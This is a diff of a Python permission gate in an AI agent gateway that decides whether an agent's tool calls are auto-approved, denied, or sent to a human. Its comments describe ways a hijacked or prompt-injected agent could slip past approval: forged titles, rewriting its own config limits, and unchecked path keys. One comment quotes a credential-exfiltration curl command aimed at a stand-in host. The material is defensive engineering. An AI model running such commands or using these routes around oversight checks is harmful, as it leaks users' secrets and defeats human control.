@@ -16,16 +16,20 @@ import logging
 import os
 import re
 import stat as _stat
+import sys
 import tempfile
 import threading
 import time
 import uuid
 from collections.abc import Iterable, Mapping, Sequence
 from contextlib import contextmanager
+from contextvars import ContextVar
 from dataclasses import asdict, dataclass, field
+from dataclasses import replace as dataclasses_replace
 from pathlib import Path
+from typing import Any
 
-from kiro_crew import platform_compat, security, webhooks
+from kiro_crew import pinned_fs, platform_compat, security, webhooks
 
 # The xattr ACL-carry policy is shared with atomic_write.atomic_write: both
 # install a fresh inode and must reproduce the source's access controls or
@@ -61,6 +65,8 @@ from kiro_crew.platform.tool_paths import (  # noqa: F401  (re-exported for call
     _TARGET_PATH_MAX_PATHS,
     TARGET_PATH_KEYS,
     TargetPaths,
+    edit_target_candidates,
+    is_edit_call,
     target_paths,
 )
 from kiro_crew.security import (
@@ -68,7 +74,10 @@ from kiro_crew.security import (
     is_sensitive_bash_command,
     is_sensitive_path,
     is_sensitive_write_path,
+    is_unverifiable_path_refusal,
+    sensitive_path_refusal,
 )
+from kiro_crew.security.readonly_bash import is_read_only_bash
 from kiro_crew.sel import sel
 from kiro_crew.session_directive import CORE_MCP_SERVER
 from kiro_crew.validation import _bounded_pattern_search
@@ -96,6 +105,9 @@ HOOK_EVENT_PRE_TOOL_USE = "PreToolUse"
 HOOK_EVENT_POST_TOOL_USE = "PostToolUse"
 HOOK_EVENT_STOP = "Stop"
 
+#: The events the gateway itself fires. ``ScriptHookStore.fire`` has a call site
+#: for each one, and ``steering-and-hooks.md`` documents their exit-code
+#: contract. Membership here is what makes an event a *lifecycle* event.
 HOOK_EVENTS = (
     HOOK_EVENT_AGENT_SPAWN,
     HOOK_EVENT_USER_PROMPT_SUBMIT,
@@ -103,6 +115,73 @@ HOOK_EVENTS = (
     HOOK_EVENT_POST_TOOL_USE,
     HOOK_EVENT_STOP,
 )
+
+# Triggers a Kiro Agent session owns that the gateway has no lifecycle call site
+# for. They are authorable and persisted, and NO EVENT FIRES ANY OF THEM: no call
+# site fires one and no other reader consumes this tuple. That is why they are a
+# separate tuple rather than new members of ``HOOK_EVENTS`` -- an event in that
+# tuple carries a promise that something calls ``fire`` for it, and these carry
+# none.
+#
+# "No event fires them" is not "the command cannot run": the dashboard's Test
+# endpoint runs a STORED hook's command on demand and never consults this tuple
+# (``handlers/hooks.py`` ``api_hook_test`` -> ``run_script_hook``), so Test works on
+# one of these exactly as it does on a fired event.
+#
+# They are not equidistant from running, and a reader planning the delivery side
+# needs the difference. A Kiro Agent requests hooks by trigger name over ACP from
+# a fixed set of seven (``acp/kas_wire.py``'s ``ACP_HOOK_TRIGGERS``), and only
+# ``preTaskExecution`` and ``postTaskExecution`` are in it; the file and manual
+# triggers are absent, so a Kiro Agent does not ask for those four at all today.
+#
+# Where the six names come from, since no call site here fires them: each is the
+# PascalCase rendering of a trigger name Kiro's own hook schema carries, so the
+# delivery round maps a documented name rather than inventing one. Kiro documents
+# both spellings of each -- the ``when.type`` name a legacy hook file uses, which
+# is also the ACP spelling for the two above, and the standalone v1 hook-file
+# trigger -- at kiro.dev/docs/ide/whats-new-v1/hooks:
+#
+#   preTaskExecution  -> PreTaskExec        postTaskExecution -> PostTaskExec
+#   fileCreated       -> PostFileCreate     fileEdited        -> PostFileSave
+#   fileDeleted       -> PostFileDelete     userTriggered     -> (none)
+#
+# Two consequences for the delivery round. It has two vocabularies to map, not
+# one, and the names here match the left column. And the manual trigger is the
+# furthest from arriving of the six: it has no v1 equivalent at all, so an
+# existing manual hook stays runnable as a legacy one while a new one cannot be
+# authored in that schema -- the Test button is its whole run path here.
+HOOK_EVENT_PRE_TASK_EXECUTION = "PreTaskExecution"
+HOOK_EVENT_POST_TASK_EXECUTION = "PostTaskExecution"
+HOOK_EVENT_FILE_CREATED = "FileCreated"
+HOOK_EVENT_FILE_EDITED = "FileEdited"
+HOOK_EVENT_FILE_DELETED = "FileDeleted"
+HOOK_EVENT_USER_TRIGGERED = "UserTriggered"
+
+HOOK_EVENTS_KAS_ONLY = (
+    HOOK_EVENT_PRE_TASK_EXECUTION,
+    HOOK_EVENT_POST_TASK_EXECUTION,
+    HOOK_EVENT_FILE_CREATED,
+    HOOK_EVENT_FILE_EDITED,
+    HOOK_EVENT_FILE_DELETED,
+    HOOK_EVENT_USER_TRIGGERED,
+)
+
+#: The subset a Kiro Agent session actually asks its client for. It requests
+#: hooks by trigger name from a fixed set of seven, and only these two of the six
+#: are in it -- so these wait on Kiro Crew answering that request, while the file
+#: and manual triggers are not asked for at all. The dashboard marks the two
+#: groups differently because the distance to running is different, and it reads
+#: the split from here rather than restating it in copy.
+HOOK_EVENTS_AGENT_REQUESTED = (
+    HOOK_EVENT_PRE_TASK_EXECUTION,
+    HOOK_EVENT_POST_TASK_EXECUTION,
+)
+
+#: Every event a hook may be authored against and persisted under. This is the
+#: authoring vocabulary -- the dashboard form's options, the create/update
+#: schemas, and the store's own load and save gates all read this set, so an
+#: event absent from it is refused at authoring time and dropped on reload.
+HOOK_EVENTS_ALL = HOOK_EVENTS + HOOK_EVENTS_KAS_ONLY
 
 
 @dataclass
@@ -129,6 +208,29 @@ class HookResult:
         return HookResult(action=HOOK_INJECT_CONTEXT, text=text)
 
 
+#: Set by :func:`uncounted_gate`; read by ``ToolHookResult._count`` and
+#: ``_audit_governance``.
+_GATE_UNCOUNTED: ContextVar[bool] = ContextVar("kirocrew_gate_uncounted", default=False)
+
+
+@contextmanager
+def uncounted_gate():
+    """Consult the gate without emitting the approval-decision counter.
+
+    For a second consultation of a request whose first one was already counted
+    (the ACP transport's permission floor). The verdict is unaffected. The
+    governance tier writes no ``governance_decision`` audit row either: this
+    consultation carries no caller identity and its caller discards a policy
+    deny, so a row here would record a denial for a call that ran. The
+    consumer's own identity-bearing consultation writes that row.
+    """
+    token = _GATE_UNCOUNTED.set(True)
+    try:
+        yield
+    finally:
+        _GATE_UNCOUNTED.reset(token)
+
+
 @dataclass
 class ToolHookResult:
     action: str  # TOOL_ALLOW, TOOL_AUTO_APPROVE, TOOL_DENY
@@ -144,6 +246,31 @@ class ToolHookResult:
     #: and deny-by-default-shell messages do not), so matching on it would
     #: classify a sensitive-path or exfiltration deny as non-security.
     security_deny: bool = True
+    #: True when a TOOL_AUTO_APPROVE was decided by the call's VERIFIED MCP
+    #: identity (``_meta.kiro`` server + tool, read from the client's own
+    #: tool_call cache) and by nothing the agent authors -- the app-own-server
+    #: grant, or an ``auto_approve_tools`` pattern matched against that
+    #: identity. False for every grant that read the title, the payload's
+    #: ``kind``, or a command. A consumer holding a backend-subagent request
+    #: whose ARGUMENTS are unverified but whose identity is
+    #: (``AcpEvent.child_mcp_identity_trusted``) may honor exactly these grants:
+    #: their matched input is the same trusted identity, so a forged title
+    #: cannot reach them. Any other auto-approve stays downgraded for that
+    #: request, as before.
+    identity_grant: bool = False
+    #: True when a TOOL_AUTO_APPROVE is the read-only CLASSIFIER's verdict —
+    #: i.e. a statement about what the call can DO: the deny-by-default bash
+    #: classifier, and for a non-shell call either the interactive path's
+    #: ACP-kind allow-list / read-only title fallback or, under
+    #: ``classifier_only``, the host-known read-only built-in identity alone
+    #: (``_HOST_READ_ONLY_BUILTIN_TOOLS``).
+    #: False when it is a GRANT: an ``auto_approve_tools`` glob (title- or
+    #: identity-keyed) or the app-own-server rule vouches for who is calling and
+    #: says nothing about the call's effect. ``ToolApprovalPolicy.READ_ONLY``
+    #: honours only the former; a surface with an interactive approver treats
+    #: both alike. The action alone cannot say which branch produced it, and a
+    #: result built outside the factory stays unproven (False) — fail-closed.
+    read_only: bool = False
 
     @staticmethod
     def _count(action: str, security_deny: bool) -> None:
@@ -167,7 +294,13 @@ class ToolHookResult:
         ``action`` is one of three module constants and ``security_deny`` a bool,
         so the series is bounded by construction -- no reason string, tool name or
         command reaches the recorder.
+
+        A consultation made inside :func:`uncounted_gate` is not counted: the
+        transport floor re-asks the gate for a request its consumer already
+        counted, and counting both would report one request as two decisions.
         """
+        if _GATE_UNCOUNTED.get():
+            return
         try:
             from kiro_crew.metrics.events import APPROVAL_DECISIONS, emit_counter
 
@@ -184,9 +317,14 @@ class ToolHookResult:
         return ToolHookResult(action=TOOL_ALLOW)
 
     @staticmethod
-    def auto_approve() -> ToolHookResult:
+    def auto_approve(*, identity_grant: bool = False, read_only: bool = False) -> ToolHookResult:
+        """Auto-approve. ``identity_grant=True`` marks a grant decided by the
+        verified MCP identity alone; ``read_only=True`` marks the read-only
+        classifier's verdict, never a grant."""
         ToolHookResult._count(TOOL_AUTO_APPROVE, False)
-        return ToolHookResult(action=TOOL_AUTO_APPROVE)
+        return ToolHookResult(
+            action=TOOL_AUTO_APPROVE, identity_grant=identity_grant, read_only=read_only
+        )
 
     @staticmethod
     def deny(reason: str) -> ToolHookResult:
@@ -491,6 +629,59 @@ def event_is_spawn_run(event: object) -> bool:
     )
 
 
+def hook_gate_kwargs(event: object, **overrides: Any) -> dict[str, Any]:
+    """The event-derived keyword arguments for ``HookManager.on_tool_call``.
+
+    One extraction, used by every permission-path dispatcher
+    (``...hooks.on_tool_call(event.title, session_key=..., **hook_gate_kwargs(event))``)
+    so an enforcement-relevant event field is threaded ONCE. A dispatcher that
+    hand-copies the fields it happens to know about drops the ones it does not
+    — the edit gate's ``diff_path``, or the trusted MCP identity a per-tool
+    deny / governance ``@server/tool`` rule keys on — and the drop is SILENT:
+    the gate never sees that signal on that surface. That is why the threading
+    lives here and not at the sites. ``test_hooks.py`` pins the helper's output
+    against the gate's own keyword signature (a new gate parameter must be
+    extracted here) and scans the package so no site hand-copies a field.
+
+    Reads the event duck-typed (``getattr`` with the gate's own defaults),
+    exactly as the channel dispatchers already did: an ``AcpEvent`` yields its
+    fields verbatim, a provider event or test double missing a field yields the
+    gate default for it, and a ``None`` in a string/bool slot is normalised to
+    that default. ``command`` comes from ``AcpEvent.shell_command`` (None for a
+    non-shell tool or an unrecoverable command, which the gate then denies by
+    default when ``is_shell`` is set); ``mcp_tool_name`` is the event's
+    ``tool_name`` (the ``_meta.kiro`` identity, not the model-authored
+    ``title``).
+
+    ``overrides`` let a surface with a genuinely different event shape replace
+    an extracted value (the auto-improvement runner recovers the command
+    provider-agnostically and falls back from ``tool_kind`` to ``tool_purpose``).
+    An override key the helper does not emit is refused: a misspelt override
+    would otherwise add a stray kwarg the gate rejects — or worse, one a future
+    gate accepts with a meaning the site never intended — so the failure is
+    loud and at the site. The structural test pins which sites override which
+    keys, so a new override is a reviewed change, never drift.
+    """
+    kwargs: dict[str, Any] = {
+        "tool_kind": getattr(event, "tool_kind", "") or "",
+        "raw_params": getattr(event, "raw_tool_params", None),
+        "diff_path": getattr(event, "diff_path", "") or "",
+        "command": getattr(event, "shell_command", None),
+        "is_shell": bool(getattr(event, "is_shell", False)),
+        "mcp_server_name": getattr(event, "mcp_server_name", "") or "",
+        "mcp_tool_name": getattr(event, "tool_name", "") or "",
+        "mcp_identity_trusted": bool(getattr(event, "mcp_identity_trusted", False)),
+        "spawn_target": getattr(event, "spawn_target", "") or "",
+    }
+    unknown = set(overrides) - set(kwargs)
+    if unknown:
+        raise TypeError(
+            "hook_gate_kwargs: override of a key it does not extract: " + ", ".join(sorted(unknown))
+        )
+    kwargs.update(overrides)
+    return kwargs
+
+
 # ── HookManager ──
 
 
@@ -499,10 +690,79 @@ class HookManager:
 
     def __init__(self, config: HooksConfig | None = None):
         self._config = config or HooksConfig()
+        self._config_sub: object | None = None
 
     def reload(self, config: HooksConfig) -> None:
         """Hot-reload hooks config."""
         self._config = config
+
+    def watch_config(self) -> object:
+        """Re-read the ``hooks`` section from config.json on every config write.
+
+        Opt-in rather than automatic, because a DERIVED manager must not follow
+        config: the heartbeat-scoped manager (``_build_heartbeat_hooks``)
+        deliberately drops the user's ``auto_approve_tools`` so
+        ``HEARTBEAT_SAFE_TOOLS`` is the sole approval authority, and re-reading the
+        section would hand that widening straight back. Only the primary
+        interactive manager -- the one the gateway builds from config in the first
+        place -- calls this; the heartbeat manager is re-derived from it each cycle,
+        so it inherits the reload without subscribing.
+
+        The keystone opt-out state is spliced in by
+        :func:`hooks_config_from_config_dict`, so a ``config.json`` write never
+        reverts a Settings>Security change (and vice versa).
+
+        Idempotent: a repeated call on the same manager is a no-op returning the
+        existing subscription, so a caller that cannot easily tell whether a
+        given manager already watches config cannot stack a duplicate applier.
+        """
+        if self._config_sub is not None:
+            return self._config_sub
+        from kiro_crew.config import live
+
+        self._config_sub = live.subscribe(
+            "hooks", callback=self._on_config_change, name="HookManager"
+        )
+        return self._config_sub
+
+    def _on_config_change(self, change: object) -> None:
+        before = self._config
+        after = hooks_config_from_config_dict(getattr(change, "new").hooks)
+        self.reload(after)
+        # A hooks reload can WIDEN what runs without a prompt, and config.json is
+        # writable by an auto-approved agent shell, so an approval-set change is
+        # SEL-audited the way the channel transports audit an allow-list reload:
+        # by COUNT and flag, never by tool name (governance still caps the set).
+        added = len(set(after.auto_approve_tools) - set(before.auto_approve_tools))
+        removed = len(set(before.auto_approve_tools) - set(after.auto_approve_tools))
+        flags = {
+            "sources": (before.auto_approve_sources != after.auto_approve_sources),
+            "subagent_spawn": (
+                before.auto_approve_subagent_spawn != after.auto_approve_subagent_spawn
+            ),
+            "subagent_tools": (
+                before.auto_approve_subagent_tools != after.auto_approve_subagent_tools
+            ),
+        }
+        flipped = sorted(k for k, v in flags.items() if v)
+        if added or removed or flipped:
+            logger.warning(
+                "hooks: auto-approval set changed via config reload (+%d/-%d tool(s), "
+                "flags: %s)",
+                added,
+                removed,
+                ",".join(flipped) or "none",
+            )
+            sel().log_api_access(
+                caller="config",
+                operation="hook_manager.reconfigure",
+                outcome="auto_approve_changed",
+                source="hooks",
+                resources=(
+                    f"added={added} removed={removed} size={len(after.auto_approve_tools)}"
+                    + (f" flags={','.join(flipped)}" if flipped else "")
+                ),
+            )
 
     @property
     def auto_approve_subagent_spawn(self) -> bool:
@@ -558,11 +818,15 @@ class HookManager:
         app: str = "",
         tool_kind: str = "",
         raw_params: dict | None = None,
+        diff_path: str = "",
         command: str | None = None,
         is_shell: bool = False,
         mcp_server_name: str = "",
         mcp_tool_name: str = "",
+        mcp_identity_trusted: bool = False,
+        spawn_target: str = "",
         resolved_agent: str = "",
+        classifier_only: bool = False,
     ) -> ToolHookResult:
         """Check if a tool should be auto-approved, denied, or handled normally.
 
@@ -595,6 +859,24 @@ class HookManager:
         tiers a synthesized ``file-search …`` target (``_search_deny_target``) for a
         search-shaped call, whose walked root and depth cap exist ONLY in its
         arguments; a caller that omits ``raw_params`` loses that coverage too.
+
+        ``diff_path`` is the path the tool call's ``{"type": "diff"}`` content
+        block named (``event.diff_path``, cached by ``acp._dispatch`` per scoped
+        toolCallId). A nonempty ``diff_path`` is itself write-plane evidence —
+        the cache is written only when a tool_call frame declares a file
+        change — so the write-protected tier judges any call carrying one (or
+        declaring the ``edit`` kind) by the UNION of the params' path
+        spellings and this path, and denies an empty union: a backend may
+        stream params that carry no path key and name the file only in that
+        block, so the params alone can judge nothing
+        (mirroring ``llm_helpers._edit_target_denial``). Defaults to
+        ``""``: a caller that does not thread it keeps params-only judgement of
+        edits, and an edit-kind call that carries params (any dict, ``{}``
+        included) or a diff block but names no path is denied rather than
+        passed unjudged. Only ``raw_params=None`` with no ``diff_path`` falls
+        through — such an edit has nothing to judge here and keeps the other
+        tiers' coverage, exactly like ``_edit_target_denial``, which an edit
+        with no params never reaches.
 
         ``is_shell`` enforces deny-by-default for shell tools: when a caller
         reports a shell tool (``is_shell=True``) but cannot supply the raw
@@ -642,6 +924,34 @@ class HookManager:
         so a deny on EITHER denies the call. Empty (no ``_meta.kiro.toolName``)
         means the tool cannot be identified, so the own-server auto-approve does
         NOT fire (fall through to interactive approval — fail-closed).
+
+        ``classifier_only`` drops the two GRANT tiers — the operator's
+        ``auto_approve_tools`` globs and the app-own-server rule — so the only
+        auto-approve left is the read-only classifier's, which carries
+        ``read_only=True`` on the result. A grant vouches for the caller and
+        says nothing about the call's effect; ``ToolApprovalPolicy.READ_ONLY``
+        (the side chat) has no approver behind it, so a grant honoured there
+        would execute a mutating tool. Every deny tier and governance still
+        run, and a call a grant would have approved is classified on its own
+        merits instead of being refused outright. Default ``False``: a caller
+        with an interactive approver keeps the grants.
+
+        Under the flag the classifier also tightens WHAT counts as proof: with
+        no approver to catch an over-approval, read-only must follow from
+        HOST-TRUSTED facts alone — the recovered shell ``command`` judged by
+        ``is_read_only_bash``, or a built-in the host knows to be read-only,
+        named by the non-model-authored ``mcp_tool_name`` with no
+        ``mcp_server_name`` (``_HOST_READ_ONLY_BUILTIN_TOOLS``) AND carrying
+        ``mcp_identity_trusted``, the provenance flag saying that pair came
+        from the ``_meta.kiro`` parse this client made of the tool_call frame
+        (``AcpEvent.mcp_identity_trusted``) rather than from an inline payload
+        or a hand-built event — without it a host-known name is unproven and
+        refused. The agent-influenced inputs — the ACP ``tool_kind`` and the title —
+        may NARROW (a non-read kind refuses) but never prove, so a mutating tool
+        labelled ``kind="read"`` or titled ``Read …`` is not auto-approved; an
+        MCP-served tool, which carries no host-trusted read-only marker, is not
+        provable either. Off the flag the interactive path keeps its ACP-kind
+        allow-list and title fallback unchanged.
         """
         # Deny-by-default: a shell tool whose command could not be recovered
         # must not be evaluated on the untrusted title alone — that is the very
@@ -695,7 +1005,19 @@ class HookManager:
         # command from any of these gates. is_sensitive_path resolves the value
         # as a path: a real file-read title ("~/.aws/credentials") matches,
         # while a bash command ("cat ~/.aws/credentials") resolves to a
-        # non-sensitive path and is instead caught by is_sensitive_bash_command.
+        # non-sensitive path and is NOT matched on its text -- the OS sandbox is
+        # what keeps the credential stores and the governance keystone out of the
+        # shell's reach. A shell tool's recovered COMMAND is therefore not handed
+        # to the path tier: resolving ``cd /x && grep ...`` as a filename never
+        # matched, but it spent a resolver round-trip per call and, under a
+        # resolver stall, refused the command as ``access to sensitive path: cd
+        # /x && grep ...`` -- a refusal naming something that is not a path as a
+        # credential. ``is_shell`` and ``command`` are the client's own
+        # classification and recovery of the tool frame, the same provenance the
+        # shell gates below trust; a shell tool whose command is a bare path is
+        # left to the sandbox, as every command is.
+        # is_sensitive_bash_command carries the size ceiling, the
+        # IMDS detector and the environment-credential detector.
         # The always-on gates below are keyed by rule id, so resolve the effective
         # regex set to ids ONCE here and thread it in. ``None`` means all enabled,
         # which is what the callers outside this gate (cron command vetting,
@@ -712,19 +1034,36 @@ class HookManager:
         # the encoded form — honouring a pin late is not honouring it.
         ctx = current_context()
         enabled_ids = security.enabled_rule_ids(self._effective_denied(ctx))
+        # The exemption is for the recovered COMMAND of a SANDBOXED shell only.
+        # kiro-cli can classify an execute-kind frame as shell while also
+        # naming an MCP server (``classify_tool_call``: the identity is carried,
+        # the shell verdict stands), and an MCP-served tool runs outside the
+        # agent sandbox that this exemption leans on -- so its targets stay
+        # path-gated. Likewise a shell-kind tool with structured parameters
+        # (``use_aws``) may carry a discrete credential path as an argument, and
+        # in ``standard`` sandbox mode ``~/.aws`` is visible to the shell: the
+        # raw_params tier below is the control there, so only the command text
+        # itself (the normalized title when it IS the command, and ``command``)
+        # is spared the resolver.
+        exempt_command = command if (is_shell and command and not mcp_server_name) else None
         for target in security_targets:
-            if is_sensitive_path(target):
-                return ToolHookResult.deny(f"Blocked: access to sensitive path: {target}")
-            # execute_bash (prefixed or bare) — check for reads of sensitive paths.
+            # Reason-or-None, like the two tiers below: a stall is refused with its
+            # own wording (unverifiable, not a match) instead of being reported as
+            # a credential hit on whatever the target happened to be.
+            reason = sensitive_path_refusal(target) if target != exempt_command else None
+            if reason:
+                return ToolHookResult.deny(reason)
+            # execute_bash (prefixed or bare) — IMDS reach, env-credential leaks,
+            # and the scan-size ceiling.
             reason = is_sensitive_bash_command(target, enabled_ids=enabled_ids)
             if reason:
                 return ToolHookResult.deny(reason)
             # Data-exfiltration / reverse-shell command shapes.
-            # The anti-exfil patterns previously lived only in the passive audit
-            # path (scan_history / dashboard count) and were never enforced at
-            # invocation, so a hijacked agent could `curl -d @~/.aws/credentials
-            # evil` or open a reverse shell unblocked. Deny them at the gate —
-            # against the raw command too, not just the title.
+            # Enforced at INVOCATION, not only in the passive audit path
+            # (scan_history / dashboard count): auditing alone leaves a hijacked
+            # agent free to `curl -d @~/.aws/credentials evil` or open a reverse
+            # shell. Denied at the gate — against the raw command too, not just
+            # the title.
             reason = audit_bash_exfiltration(target, enabled_ids=enabled_ids)
             if reason:
                 return ToolHookResult.deny(reason)
@@ -736,10 +1075,10 @@ class HookManager:
         # the title hides it. This is the keystone the governance model leans on
         # (agent-cannot-rewrite-its-own-ceiling), so it must not be title-gated.
         # EVERY accepted spelling, and a deny on any of them denies: a backend that
-        # sends ``filePath`` (the camel-case form the search plane has always
-        # accepted) reached NEITHER of the two snake_case reads this used to do, so
-        # a write to ~/.ssh under that key was never gated and the human was asked
-        # to approve a path the keystone should have refused outright.
+        # sends ``filePath`` (the camel-case form the search plane accepts) reaches
+        # neither of the two snake_case keys, so reading only those leaves a write
+        # to ~/.ssh under that key ungated and asks the human to approve a path the
+        # keystone should have refused outright.
         if raw_params:
             real_paths = target_paths(raw_params)
             if real_paths.truncated:
@@ -753,8 +1092,9 @@ class HookManager:
                     "paths (deny-by-default)"
                 )
             for real_path in real_paths:
-                if is_sensitive_path(real_path):
-                    return ToolHookResult.deny(f"Blocked: access to sensitive path: {real_path}")
+                reason = sensitive_path_refusal(real_path)
+                if reason:
+                    return ToolHookResult.deny(reason)
         # Config files are WRITE-protected (reads stay allowed): block the agent's
         # file-EDIT tool from modifying config.json / config.local.json so a
         # prompt-injected agent cannot rewrite its own resource ceilings
@@ -763,25 +1103,69 @@ class HookManager:
         # on the ACP ``edit`` kind (the fs_write/code tool) so a plain read of
         # config is unaffected — the dashboard file viewer, ``cat``, and knowledge
         # indexing legitimately read config.json. Bash writes (``tee``/``>``/
-        # ``cp``-dest) are blocked separately by ``is_sensitive_bash_command``
-        # above; this branch covers the file-EDIT tool.
+        # ``cp``-dest) are not matched on command text; the OS sandbox is the
+        # shell-side control, and this branch covers the file-EDIT tool.
         #
-        # Empty/unknown ``tool_kind`` (the ACP kind field is spec-optional; some
-        # backends omit it) is DELIBERATELY not mirrored here.
+        # The branch routes on ``is_edit_call``: the ``edit`` kind, OR a diff
+        # content block naming a path — the diff block is the edit's target of
+        # record, and only a call declaring a file change carries one, so its
+        # PRESENCE is write-plane evidence however the spec-optional ``kind``
+        # field arrived (empty, or even ``read``). The read allowance below is
+        # keyed on the ABSENCE of a diff block, not on the kind: a kindless
+        # call WITHOUT one stays a read, because
         # ``governance._scopes_for_call`` (platform/governance.py) infers BOTH
-        # filesystem.read AND filesystem.write from a lone ``path`` when the kind
-        # is empty, because it is a *policy intersection* where an ungoverned
-        # scope permits. This gate is a HARD deny, so applying that same shape
-        # inference would also block legitimate config READS that arrive without a
-        # kind — regressing the read-allowance that is the whole point of the
-        # write-only tier. Empty-kind edits are rare (the ACP fs_write tool sets
-        # ``edit``); not hard-denying them keeps the two write-gates from drifting
-        # into a read regression, and the bash gate covers the shell surface.
-        if tool_kind == _EDIT_TOOL_KIND and raw_params:
+        # filesystem.read AND filesystem.write from a lone ``path`` when the
+        # kind is empty as a *policy intersection* where an ungoverned scope
+        # permits, while this gate is a HARD deny — applying that shape
+        # inference to diff-less calls would block legitimate config READS,
+        # regressing the read-allowance that is the whole point of the
+        # write-only tier. The OS sandbox covers the shell surface.
+        if is_edit_call(tool_kind, diff_path) and (raw_params is not None or diff_path):
             # Same spelling coverage as the sensitive-path keystone above, for the
             # same reason: the write-protected tier is worthless if a config edit
-            # can name its target under a key the check never reads.
-            for wpath in target_paths(raw_params):
+            # can name its target under a key the check never reads. The judged
+            # set is the UNION of the params' path spellings and the diff content
+            # block's path, computed by the SAME helper the always-enforced tier
+            # uses (``edit_target_candidates``): a backend may stream params that
+            # carry no path key at all and name the file only in that block, so
+            # the params alone can judge nothing.
+            candidates = edit_target_candidates(raw_params, diff_path)
+            if candidates.truncated:
+                # Unreachable while the keystone above denies a truncated walk
+                # first, but this branch keeps its own fail-closed reading so a
+                # reorder above cannot silently turn a partial scan into a pass.
+                return ToolHookResult.deny(
+                    "Blocked: tool arguments too large to verify for sensitive "
+                    "paths (deny-by-default)"
+                )
+            if candidates.unanchored:
+                # The diff block's path is a verbatim backend field. A relative
+                # one resolves against the gateway process CWD, not the agent
+                # workspace, so a workspace symlink can point it at a protected
+                # file no gate would recognize under its unanchored spelling —
+                # deny as unverifiable, same fail-closed shape as truncation.
+                return ToolHookResult.deny(
+                    "Blocked: file edit names a relative target path that "
+                    "cannot be verified (deny-by-default)"
+                )
+            if not candidates:
+                # Mirrored from the always-enforced tier: a declared file edit
+                # whose params and content block together name no target has no
+                # proven target to judge — deny rather than approve blind.
+                # ``raw_params={}`` takes this deny too (the branch enters on
+                # ``is not None``, not truthiness), matching
+                # ``_edit_target_denial``, which selects ANY dict via
+                # ``isinstance`` and denies its empty union — a falsy-guard
+                # skip here would be the fail-open the two-gate parity exists
+                # to prevent. Scoped to the edit kind: the empty/unknown
+                # ``tool_kind`` case above stays a read allowance, and an edit
+                # event carrying ``raw_params=None`` and no diff block never
+                # enters this branch (matching ``_edit_target_denial``, which
+                # such an edit never reaches either).
+                return ToolHookResult.deny(
+                    "Blocked: file edit names no target path to verify (deny-by-default)"
+                )
+            for wpath in candidates:
                 if is_sensitive_write_path(wpath):
                     return ToolHookResult.deny(
                         f"Blocked: modification of write-protected config path: {wpath}"
@@ -869,6 +1253,25 @@ class HookManager:
             )
             if reason:
                 return ToolHookResult.deny(reason)
+        # The user's own ``auto_deny_tools`` GLOBS, and only those, are also
+        # matched against the identity in the ``@server/tool`` spelling the
+        # approve loop below uses (plus ``Running: @server/tool`` and the bare
+        # ``@server``, so a server-level rule binds to every tool). A user who
+        # writes both lists in one spelling -- ``auto_approve_tools:
+        # ["@ops/*"]``, ``auto_deny_tools: ["@ops/delete_*"]`` -- otherwise gets
+        # an approve keyed on the verified identity while the deny rides the
+        # forgeable title, and a benign title over a denied tool auto-fires.
+        # Kept OUT of ``deny_targets`` above on purpose: the shipped regex rules
+        # are authored against shell text, and running them over a synthesized
+        # reference is the accidental widening the note above forbids. Not
+        # gated on provenance: a deny can only ever deny.
+        if mcp_server_name and self._config.auto_deny_tools:
+            _tool_ref = mcp_identity_ref(mcp_server_name, mcp_tool_name)
+            for _ref in (_tool_ref, f"Running: {_tool_ref}", mcp_identity_ref(mcp_server_name, "")):
+                if _ref and any(
+                    _tool_matches(pattern, _ref) for pattern in self._config.auto_deny_tools
+                ):
+                    return ToolHookResult.deny(f"Blocked by security policy: {_ref}")
 
         # A file-search builtin's scope lives only in its arguments -- it carries no
         # ``command``, and its title need not name the root it walks -- so this target is
@@ -938,8 +1341,10 @@ class HookManager:
             app,
             tool_kind,
             raw_params,
+            diff_path=diff_path,
             mcp_ref=governance_mcp_ref,
             extra_titles=(mcp_tool_name,) if mcp_tool_name and mcp_tool_name != tool_name else (),
+            spawn_target=spawn_target,
         )
         if gov_reason:
             return ToolHookResult.deny_policy(gov_reason)
@@ -1002,9 +1407,18 @@ class HookManager:
         # a completely different runtime agent. An empty ``resolved_agent`` (an
         # uncached permission event, or a caller that does not thread it through)
         # yields no identity — fail-closed to interactive approval.
+        #
+        # The two GRANT tiers — this app-own-server rule and the operator's
+        # ``auto_approve_tools`` globs below — vouch for the CALLER and say
+        # nothing about what the call does. ``classifier_only`` skips exactly
+        # these two, so the read-only classifier further down judges the call
+        # on its own merits (a grant that shadows a read costs nothing, a grant
+        # that shadows a write approves nothing). Every deny tier and governance
+        # ran above regardless of the flag.
         owner_app = app or _builtin_app_for_agent(resolved_agent)
         if (
-            _app_owns_mcp_server(mcp_server_name, owner_app)
+            not classifier_only
+            and _app_owns_mcp_server(mcp_server_name, owner_app)
             and _is_first_party_app(owner_app)
             and _is_declared_builtin_mcp_server(mcp_server_name)
         ):
@@ -1023,19 +1437,63 @@ class HookManager:
             # server alone. Fall through to interactive approval (fail-closed),
             # never silent execute.
             if canonical_mcp_name:
-                return ToolHookResult.auto_approve()
+                return ToolHookResult.auto_approve(identity_grant=mcp_identity_trusted)
 
         # Auto-approve — match against both the original title (preserves
         # "Running: "/"Reading " prefixes) and the normalized name (stripped)
         # so that "Running: *" and bare tool-name patterns both work.
         #
-        # This loop matches only the TITLE, which the agent authors — safe here
+        # This loop matches the TITLE, which the agent authors — safe here
         # ONLY because a shell call whose command could not be recovered was
         # already hard-denied above, so no unverified command can reach it. Do not
         # weaken that refusal without also gating this loop.
-        for pattern in self._config.auto_approve_tools:
-            if _tool_matches(pattern, tool_name) or _tool_matches(pattern, normalized):
-                return ToolHookResult.auto_approve()
+        #
+        # For an MCP-served call whose canonical identity is VERIFIED — both
+        # ``_meta.kiro`` fields present AND the caller's ``mcp_identity_trusted``
+        # provenance flag set (the event's own flag, earned only when the
+        # identity came from the client's tool_call cache; non-emptiness alone
+        # is not provenance, see ``AcpEvent.mcp_identity_trusted``) — the
+        # pattern is matched against THAT identity, in place of the title. A
+        # grant keyed on the title would let a model-authored ``description``
+        # that reads like an allowed tool approve a different one; keyed on the
+        # identity, the pattern approves exactly the tool that executes. Two
+        # spellings of the same identity: kiro-cli's own title form
+        # ``Running: @server/tool`` and the governance reference
+        # ``@server/tool`` (``mcp_identity_ref``). The wire form
+        # ``mcp__server__tool`` is deliberately NOT a grant target: a server
+        # or tool name may itself contain ``__``, so two different verified
+        # identities can share one wire spelling, and a grant written against
+        # it would approve the other tool. The deny list may accept that form
+        # (over-denying is safe); a grant may not. An identity that is present
+        # but unproven falls back to the title branch, exactly as before.
+        #
+        # The whole loop is a GRANT tier, so ``classifier_only`` skips it
+        # (see the app-own-server rule above for why).
